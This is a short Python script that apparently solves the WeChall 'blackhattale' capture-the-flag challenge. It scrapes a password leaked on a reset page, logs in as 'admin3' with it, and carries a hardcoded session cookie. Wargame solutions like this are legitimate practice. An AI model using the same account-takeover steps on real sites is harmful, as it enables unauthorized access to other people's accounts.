import requests
from bs4 import BeautifulSoup

cookies = {"WC": "11098479-37667-ATTdbCcWQrloi9m8"}
url1 = "https://www.wechall.net/challenge/Z/blackhattale/index.php?key=jennifer&submit=submit"
#url2 = "https://www.wechall.net/challenge/Z/blackhattale/login.php"
url3 = "https://www.wechall.net/challenge/Z/blackhattale/login.php?action=request"

r1 = requests.get(url1, cookies=cookies)
#print r1
r2 = requests.get(url3, cookies=cookies)
soup = BeautifulSoup(r2.text, "lxml")
info = soup.find("div",{"id":"page"})
#print info.text
username = "admin3"
password = info.text[-6:]
url4 = "https://www.wechall.net/challenge/Z/blackhattale/login.php?action=login&username=admin3&password=%s"%password
#print url4
r3 = requests.get(url4, cookies=cookies)
print r3.text
#print info.text, password
#print url4

url5 = "https://www.wechall.net/challenge/Z/blackhattale/upload_asc.php"
